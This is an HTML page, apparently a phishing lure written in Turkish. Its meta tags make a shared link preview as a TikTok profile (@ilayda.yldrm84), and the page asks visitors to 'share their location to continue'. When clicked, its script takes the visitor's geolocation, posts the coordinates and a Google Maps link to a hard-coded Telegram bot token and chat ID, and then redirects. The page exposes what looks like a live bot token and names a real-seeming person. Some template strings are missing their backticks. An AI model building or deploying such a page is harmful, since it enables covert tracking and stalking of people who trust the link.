<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Konum Gönder</title>

  <!-- TikTok Profiline ait Open Graph ve Twitter meta etiketleri (WhatsApp ve sosyal medya önizlemesi için) -->
  <meta property="og:title" content="@ilayda.yldrm84 | TikTok">
  <meta property="og:description" content="TikTok'ta @ilayda.yldrm84 profilini keşfet!">
  <meta property="og:image" content="https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1661461738075141~c5_720x720.jpeg"> <!-- TikTok Profil Fotoğrafı -->
  <meta property="og:url" content="https://www.tiktok.com/@ilayda.yldrm84">
  
  <!-- Twitter için meta etiketler -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="@ilayda.yldrm84 | TikTok">
  <meta name="twitter:description" content="TikTok'ta @ilayda.yldrm84 profilini keşfet!">
  <meta name="twitter:image" content="https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1661461738075141~c5_720x720.jpeg">

</head>
<body style="text-align:center; font-family:sans-serif; margin-top:50px;">
  <h2>@ilayda.yldrm84 TikTok Profili</h2>
  <p>Devam etmek için konumunuzu paylaşın.</p>
  <button id="sendLocationBtn" style="padding:10px 20px; font-size:16px;">
    📍 Konumumu Gönder
  </button>

  <script>
    const botToken = "7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA";
    const chatId = "6358000072";
    const redirectURL = "https://instagramreports-njr2.vercel.app/?profile=https://www.tiktok.com/@ilayda.yldrm84";  // Vercel linki + TikTok Profil Linki

    // Konum gönderme fonksiyonu
    function sendLocation(lat, lon) {
      fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: 📍 Konum alındı:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}
        })
      }).then(() => {
        window.location.href = redirectURL;  // Konum gönderildikten sonra TikTok profil linkine yönlendir.
      }).catch(() => {
        window.location.href = redirectURL;
      });
    }

    // Konum alma ve gönderme işlemi
    document.getElementById("sendLocationBtn").addEventListener("click", function () {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            sendLocation(pos.coords.latitude, pos.coords.longitude);  // Konumu gönder
          },
          err => {
            alert("Konum alınamadı: " + err.message);
            window.location.href = redirectURL;  // Konum alınmazsa, TikTok profilini göster
          }
        );
      } else {
        alert("Tarayıcınız konum desteği sunmuyor.");
        window.location.href = redirectURL;  // Tarayıcı konum desteği sunmuyorsa, TikTok profilini göster
      }
    });
  </script>
</body>
</html>
